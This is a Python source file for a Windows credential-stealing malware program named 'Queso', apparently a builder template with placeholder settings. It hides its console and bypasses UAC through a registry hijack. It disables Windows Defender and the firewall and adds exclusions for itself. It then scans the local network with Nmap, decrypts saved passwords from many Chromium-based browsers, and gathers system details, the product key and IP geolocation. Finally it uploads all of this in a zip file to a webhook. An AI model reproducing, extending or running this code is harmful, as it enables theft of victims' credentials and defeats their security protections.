import os
import sys
import subprocess
import ctypes
from threading import Thread
from urllib3 import PoolManager
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import random
import nmap3
from xml.etree import ElementTree
import zipfile
import shutil
import traceback


class _o_Syscalls:

    @staticmethod
    def _o_HideConsole():
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def _o_CryptUnprotectData(_o_EncryptedData: bytes):

        class _o_DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]

        _o_pDataIn = _o_DATA_BLOB(len(_o_EncryptedData), ctypes.cast(_o_EncryptedData, ctypes.POINTER(ctypes.c_ubyte)))
        _o_pDataOut = _o_DATA_BLOB()
        
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(_o_pDataIn), None, None, None, None, 0, ctypes.byref(_o_pDataOut)):
            _o_DataOut = (ctypes.c_ubyte * _o_pDataOut.cbData)()
            ctypes.memmove(_o_DataOut, _o_pDataOut.pbData, _o_pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(_o_pDataOut.pbData)
            return bytes(_o_DataOut)

        raise ValueError("Invalid _o_EncryptedData provided.")
    

class _o_Errors:

    _o_ErrorList: list[str] = []

    @staticmethod
    def _o_Catch(_o_CatchFunction):
        def _o_FunctionWrapper(*args, **kwargs):
            try:
                return _o_CatchFunction(*args, **kwargs)
            except Exception as _o_CatchError:
                if isinstance(_o_CatchError, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(_o_CatchError, UnicodeEncodeError):
                    _o_CatchTraceback = traceback.format_exc()
                    _o_Errors._o_ErrorList.append(_o_CatchTraceback)

        return _o_FunctionWrapper


class _o_Utility:

    @staticmethod
    def _o_GetSelf(): # Get the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def _o_IsAdmin():
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0

    @staticmethod
    def _o_UACbypass(_o_BypassMethod: int = 1): # Bypass UAC
        if _o_Utility._o_GetSelf()[1]:
            _o_Execute = lambda _o_Cmd: subprocess.run(_o_Cmd, shell= True, capture_output= True).returncode == 0
        
            if _o_BypassMethod == 1:
                if not _o_Execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): _o_Utility._o_UACbypass(2)
                if not _o_Execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): _o_Utility._o_UACbypass(2)
                _o_Execute("computerdefaults --nouacbypass")
                _o_Execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            
            elif _o_BypassMethod == 2:
                _o_Execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                _o_Execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                _o_Execute("fodhelper --nouacbypass")
                _o_Execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

            os._exit(0)

    @staticmethod
    def _o_GetRandomString(_o_Length: int = 5, _o_Invisible: bool = False): # Generates a random string
        if _o_Invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(_o_RandChar) for _o_RandChar in range(8192, 8208)], k= _o_Length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= _o_Length))
        
    @staticmethod
    def _o_CreateZip(_o_ZipData: dict): # Create a zip file
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as _o_DataPack:
            for _o_FileExtension in _o_ZipData:
                for _o_FileName in _o_ZipData[_o_FileExtension]:
                    _o_FileData = _o_ZipData[_o_FileExtension][_o_FileName]
                    with _o_DataPack.open(f"{_o_FileName}.{_o_FileExtension}", "w") as _o_ZipFile:
                        if _o_FileExtension == "xml":
                            _o_ZipFile.write(bytes(ElementTree.tostring(_o_FileData).decode('utf-8'), 'utf-8'))
                        else:
                            _o_ZipFile.write(bytes(_o_FileData, 'utf-8'))

    @staticmethod
    def _o_KillTask(*_o_TaskList: str):
        _o_TaskList = list(map(lambda _o_X: _o_X.lower(), _o_TaskList))
        _o_Cmd = subprocess.run("tasklist /FO LIST", shell= True, capture_output= True).stdout.decode(errors= "ignore")
        _o_CmdOut = _o_Cmd.strip().split('\r\n\r\n')
        for _o_I in _o_CmdOut:
            _o_I = _o_I.split("\r\n")[:2]
            try:
                _o_ProcName, _o_ProcId = _o_I[0].split()[-1], int(_o_I[1].split()[-1])
                _o_ProcName = _o_ProcName[:-4] if _o_ProcName.endswith(".exe") else _o_ProcName
                if _o_ProcName.lower() in _o_TaskList:
                    subprocess.run("taskkill /F /PID %d" % _o_ProcId, shell= True, capture_output= True)
            except Exception:
                pass


class _o_Network:

    @staticmethod
    def _o_GetNetAdapters(): # Get a list of network adapters
        _o_Adapters = list()
        _o_Cmd = subprocess.run(
            "powershell -Command Get-NetAdapter -Name *",
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        _o_LinesOut = _o_Cmd.stdout.decode('utf-8').split('\n')
        for _o_LineOut in _o_LinesOut:
            if _o_LineOut.startswith("Name") or _o_LineOut.startswith("----") or _o_LineOut.isspace():
                pass
            else:
                print(_o_LineOut)
                _o_Adapter = _o_LineOut.split("   ")[0]
                if "..." in _o_Adapter:
                    pass
                else:
                    _o_Adapters.append(_o_Adapter)
        return _o_Adapters
    
    @staticmethod
    def _o_GetNetConnection(_o_Adapter: str): # Get an adapter's network _o_Connection
        _o_Cmd = subprocess.run(
            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(_o_Adapter),
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        _o_LinesOut = _o_Cmd.stdout.decode('utf-8').split('\n')
        _o_Connection = ""
        for _o_LineOut in _o_LinesOut:
            if _o_LineOut.startswith("Name"):
                _o_Connection = _o_LineOut.split(" : ")[1]
                break
        if _o_Connection:
            return _o_Connection
        return "None"

    @staticmethod
    def _o_DisableFirewall(): # Disable Windows Firewall
        _o_Adapters = _o_Network._o_GetNetAdapters()
        for _o_Adapter in _o_Adapters: # Loop over all adapters
            print(_o_Adapter)
            _o_Connection = _o_Network._o_GetNetConnection(_o_Adapter)
            if _o_Connection == "None":
                pass
            else: # Set network type to private
                subprocess.Popen(
                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(_o_Connection),
                    shell= True
                )
            # Disable firewall on private networks
        subprocess.Popen(
            "powershell -Command Set-NetFirewallProfile -Profile Private -Enabled False",
            shell= True
        )

    @staticmethod
    def _o_ExcludeFromFirewall(_o_FilePath: str = None): # Exclude a file from Windows Firewall
        if _o_FilePath is None:
            _o_FilePath = _o_Utility._o_GetSelf()[0]
        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(_o_FilePath))

    @staticmethod
    def _o_InstallNmap(): # Install Nmap
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as _o_NmapZip:
            _o_NmapZip.extractall("C:\\Program Files (x86)")

    @staticmethod
    def _o_NmapScan(_o_IpRange: str, _o_NmapArgs: str ="-sV -T4 -O -F --version-light"): # Perform an Nmap scan
        _o_NmapSession = nmap3.Nmap()
        return _o_NmapSession.scan_command(_o_IpRange, _o_NmapArgs)
    
class _o_Defender:

    @staticmethod
    def _o_ExcludeFromDefender(_o_FilePath: str = None): # Exclude a file from Windows Defender
        if _o_FilePath is None:
            _o_FilePath = _o_Utility._o_GetSelf()[0]
        subprocess.Popen(
            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(_o_FilePath),
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )

    @staticmethod
    def _o_DisableDefender(): # Disable Windows Defender
        subprocess.Popen(
            "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $True -DisableRealtimeMonitoring $True",
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )


class _o_Tasks:

    _o_TaskThreads: list[Thread] = list()

    @staticmethod
    def _o_AddTask(task: Thread):
        _o_Tasks._o_TaskThreads.append(task)

    @staticmethod
    def _o_WaitForAll():
        for _o_TaskThread in _o_Tasks._o_TaskThreads:
            _o_TaskThread.join()


class _o_Browsers:

    class _o_Chromium:

        _o_BrowserPath: str = None
        _o_EncryptionKey: bytes = None

        def __init__(self, _o_BrowserPath: str):
            if not os.path.isdir(_o_BrowserPath):
                raise NotADirectoryError("Browser path not found.")
            
            self._o_BrowserPath = _o_BrowserPath

        def _o_GetEncryptionKey(self): # Get the browser's encryption key
            if self._o_EncryptionKey is not None:
                return self._o_EncryptionKey
            
            else:
                # Look for local state file
                _o_LocalStatePath = os.path.join(self._o_BrowserPath, "Local State")
                if os.path.isfile(_o_LocalStatePath):
                    with open(_o_LocalStatePath, encoding= "utf-8", errors= "ignore") as _o_LocalStateFile:
                        # Load contents to json
                        json_content: dict = json.load(_o_LocalStateFile)

                    # Decode and unprotect the encryption key
                    _o_EncryptedKey: str = json_content["os_crypt"]["encrypted_key"]
                    _o_EncryptedKey = base64.b64decode(_o_EncryptedKey.encode())[5:]
                    self._o_EncryptionKey = _o_Syscalls._o_CryptUnprotectData(_o_EncryptedKey)

                    return self._o_EncryptionKey
                
                else:
                    return None
                
        def _o_DecryptData(self, _o_Buffer: bytes, _o_EncryptionKey: bytes): # Decrypt data
            _o_EncryptionVersion = _o_Buffer.decode(errors= "ignore")

            # Detect encryption version
            if _o_EncryptionVersion.startswith(("v10", "v11")):
                # Set IV and Data
                _o_IV = _o_Buffer[3:15]
                _o_CipherData = _o_Buffer[15:]
                # Decrypt using AES256-GCM
                _o_EncryptionCipher = AES.new(_o_EncryptionKey, AES.MODE_GCM, _o_IV)
                _o_DecryptedData = _o_EncryptionCipher.decrypt(_o_CipherData)[:-16].decode()
                return _o_DecryptedData
            else:
                # Decrypt using CryptUnprotectData
                return str(_o_Syscalls._o_CryptUnprotectData(_o_Buffer))            
            
        def _o_GetCreds(self): # Get the browser's credentials
            _o_EncryptionKey = self._o_GetEncryptionKey()
            _o_PasswordList = list()

            if _o_EncryptionKey is None:
                return _o_PasswordList
            
            _o_LoginFilePaths = list()

            for _o_BrowserRoot, _, _o_BrowserFiles in os.walk(self._o_BrowserPath): # Find login file paths
                for _o_BrowserFile in _o_BrowserFiles:
                    if _o_BrowserFile.lower() == "login data":
                        _o_FilePath = os.path.join(_o_BrowserRoot, _o_BrowserFile)
                        _o_LoginFilePaths.append(_o_FilePath)
            
            for _o_LoginFilePath in _o_LoginFilePaths:
                while True: # Maintain a temp file
                    _o_TempFile = os.path.join(os.getenv("temp"), _o_Utility._o_GetRandomString(10) + ".tmp")
                    if not os.path.isfile(_o_TempFile):
                        break

                try: # Copy the login file's contents to the temp file
                    shutil.copy(_o_LoginFilePath, _o_TempFile)
                except Exception:
                    continue

                # Connect to the temp file with sql
                _o_DB = sqlite3.connect(_o_TempFile)
                _o_DB.text_factory = lambda _o_Data : _o_Data.decode(errors= "ignore")
                _o_DBCursor = _o_DB.cursor()

                try:
                    # Get the credentials
                    _o_Results = _o_DBCursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    # Decrypt the passwords and add to the password list
                    for _o_URL, _o_User, _o_Password in _o_Results:
                        if _o_URL and _o_User and _o_Password:
                            _o_PasswordList.append((_o_URL, _o_User, self._o_DecryptData(_o_Password, _o_EncryptionKey)))
                
                except Exception:
                    pass

                # Close the files
                _o_DBCursor.close()
                _o_DB.close()
                os.remove(_o_TempFile)

            return _o_PasswordList


class Queso:

    _o_Webhook: str = "%webhook%"
    _o_TempFolder: str = None

    def __init__(self) -> None:

        while True: # Maintain a temp folder
            self._o_TempFolder = os.path.join(os.getenv("temp"), _o_Utility._o_GetRandomString(10, True))
            if not os.path.isdir(self._o_TempFolder):
                os.makedirs(self._o_TempFolder, exist_ok= True)
                break

        _o_DefaultTasks = (
            (self._o_LaunchBoundApplication, False),
            (self._o_SendData, False)
        )

        # Hide the console
        _o_Syscalls._o_HideConsole()

        if "%uacbypass%":
            if not _o_Utility._o_IsAdmin(): # If not an admin, try to be one
                if _o_Utility._o_GetSelf()[1] and not "--no-bypass" in sys.argv:
                        _o_Utility._o_UACbypass()

        if _o_Utility._o_IsAdmin(): # We're admin now
            
            if "%disable_defender%":
                # Disable Windows _o_Defender and exclude this file
                _o_Defender._o_DisableDefender()
                _o_Defender._o_ExcludeFromDefender()

            if "%disable_firewall%":
                # Disable Windows Firewall and exclude this file
                _o_Network._o_DisableFirewall()
                _o_Network._o_ExcludeFromFirewall()

            if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                _o_Network._o_InstallNmap()

        for _o_Func, _o_Daemon in _o_DefaultTasks: # Start user tasks
            _o_Thread = Thread(target= _o_Func, daemon= _o_Daemon)
            _o_Thread.start()
            _o_Tasks._o_AddTask(_o_Thread)

        _o_Tasks._o_WaitForAll()

    def _o_LaunchBoundApplication(self): # Launch the bound application
        _o_BoundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
        if os.path.isfile(_o_BoundExePath):
            subprocess.Popen("{}".format(_o_BoundExePath))

    @_o_Errors._o_Catch
    def _o_StealBrowserCreds(self):
        _o_BrowserThreads: list[Thread] = []
        _o_BrowserPaths = {
            "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
            "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
            "_o_Chromium" : (os.path.join(os.getenv("localappdata"), "_o_Chromium", "User Data"), "chromium"),
            "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
            "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
            "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
            "Iridium" : (os.path.join(os.getenv("localappdata"), "Iridium", "User Data"), "iridium"),
            "Opera" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"), "opera"),
            "Opera GX" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"), "operagx"),
            "Slimjet" : (os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"), "slimjet"),
            "UR" : (os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"), "urbrowser"),
            "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
            "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
        }

        for _o_BrowserName, _o_BrowserItem in _o_BrowserPaths.items():
            _o_BrowserPath, _o_ProcName = _o_BrowserItem
            if os.path.isdir(_o_BrowserPath):
                def browser_steal(_o_dName, _o_dPath):
                    try:
                        _o_Utility._o_KillTask(_o_ProcName)
                        _o_BrowserInstance = _o_Browsers._o_Chromium(_o_dPath)
                        _o_PasswordFilePath = os.path.join(os.getcwd(), "dumped_creds.txt")

                        _o_BrowserPasswords = _o_BrowserInstance._o_GetCreds()

                        if _o_BrowserPasswords:
                            _o_PasswordsOut = ["{},{},{}\n".format(*_o_PasswordData) for _o_PasswordData in _o_BrowserPasswords]
                            if not os.path.exists(_o_PasswordFilePath):
                                with open(_o_PasswordFilePath, "w") as _o_PasswordFile:
                                    _o_PasswordFile.write("".join(_o_PasswordsOut))
                            else:
                                with open(_o_PasswordFilePath, "a") as _o_PasswordFile:
                                    _o_PasswordFile.write("".join(_o_PasswordsOut))
                    
                    except Exception:
                        pass
                
                _o_BrowserThread = Thread(target= browser_steal, args= (_o_BrowserName, _o_BrowserPath))
                _o_BrowserThread.start()
                _o_BrowserThreads.append(_o_BrowserThread)
            
        for _o_BrowserThread in _o_BrowserThreads:
            _o_BrowserThread.join()

    def _o_SendData(self): # Send gathered data to the webhook

        if "%log_sysinfo%":
            # Gather system information
            _o_ComputerName = os.getenv("computername")
            _o_OS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
            _o_UUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
            _o_CPU = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
            _o_GPU = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
            _o_ProductKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

            _o_SystemInfo = f"""
                \nComputer Name: {_o_ComputerName}
                \nOS: {_o_OS}
                \nUUID: {_o_UUID}
                \nCPU: {_o_CPU}
                \nGPU: {_o_GPU}
                \nProduct Key: {_o_ProductKey}
            """

        _o_HttpManager = PoolManager()

        if "%log_ipinfo%":
            try: # Try to gather IP information
                _o_R: dict = json.loads(_o_HttpManager.request("GET", "http://ip-api.com/json/").data.decode())
                if _o_R.get("status") != "success":
                    raise Exception("Failed to retrieve IP info")
                _o_IpData = f"""
                    \nIP: {_o_R['query']}
                    \nCountry: {_o_R['country']}
                    \nTimezone: {_o_R['timezone']}
                    \nRegion: {_o_R['regionName']}
                    \nZIP: {_o_R['zip']}
                    \nCoordinates: [{_o_R['lat']}, {_o_R['lon']}]
                    \nISP: {_o_R['isp']}
                """
            except Exception: # Throw an error if we can't
                _o_IpInfo = "(No IP info)"
            else:
                _o_IpInfo = _o_IpData

        # Create the embed
        _o_WebhookPayload = {
            "embeds": [
                {
                    "title": "Queso Project",
                    "description": "**Info Gathered:**\n",
                    "footer": {
                        "text": "Information by Queso"
                    }
                }
            ],
            "username": "Queso"
        }

        if _o_SystemInfo:
            _o_WebhookPayload["embeds"][0]["description"] += f"_System Info_\n```autohotkey\n{_o_SystemInfo}```\n"
        if _o_IpInfo:
            _o_WebhookPayload["embeds"][0]["description"] += f"_IP Info_\n```prolog\n{_o_IpInfo}```\n"

        _o_WebhookFields = dict()

        # Create a dict for our zip file data
        _o_ZipData = {
            "xml": {},
            "txt": {}
        }

        if "%nmap_scan%":
            _o_LocalScan: ElementTree = None
            _o_NetworkScan: ElementTree = None

            # Create a scan of the host system
            _o_LocalScan = _o_Network._o_NmapScan("127.0.0.1")
            if _o_LocalScan:
                _o_ZipData['xml']['localhost scan'] = _o_LocalScan

            # And a scan of the local network
            _o_NetworkScan = _o_Network._o_NmapScan("192.168.1.1/24")
            if _o_NetworkScan:
                _o_ZipData['xml']['local network scan'] = _o_NetworkScan
        
        if "%steal_credentials%":
            self._o_StealBrowserCreds()
            _o_PasswordFilePath = os.path.join(os.getcwd(), "dumped_creds.txt")
            if os.path.exists(_o_PasswordFilePath):
                with open(_o_PasswordFilePath, "r") as _o_PasswordFile:
                    _o_ZipData['txt']['dumped_creds'] = _o_PasswordFile.read()

        # Try to create a zip file and attach it if we can
        _o_Utility._o_CreateZip(_o_ZipData)
        if os.path.exists(os.path.join(sys._MEIPASS, "data.zip")):
            with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as _o_ZipFile:
                _o_WebhookFields['file'] = (f"{os.getlogin()}.zip", _o_ZipFile.read())


        _o_WebhookFields['payload_json'] = json.dumps(_o_WebhookPayload).encode() # Append the embed
        _o_HttpManager.request("POST", self._o_Webhook, fields= _o_WebhookFields) # Bon voyage!


if os.name == "nt":

    queso = Queso()
